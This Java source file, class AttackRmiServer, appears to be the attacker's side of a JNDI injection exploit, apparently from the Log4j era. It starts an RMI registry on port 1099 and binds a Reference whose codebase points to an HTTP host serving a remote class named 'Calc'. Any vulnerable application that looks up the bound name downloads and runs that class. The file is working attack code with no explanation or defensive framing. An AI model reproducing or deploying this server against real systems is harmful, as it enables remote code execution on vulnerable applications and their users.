package club.junefory.jndi.rmi.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author Jarvis
 * @version 1.0
 * @description: TODO
 * @date 2021/12/30 9:18
 */
public class AttackRmiServer {
    public static void main(String[] args) {
        try {
            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference reference = new Reference("Calc", "Calc", "http://192.168.3.144:8082/market/static");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("attackRmiMethod", referenceWrapper);

            Thread.currentThread().join();
        } catch (RemoteException | AlreadyBoundException | InterruptedException | NamingException e) {
            e.printStackTrace();
        }
    }
}
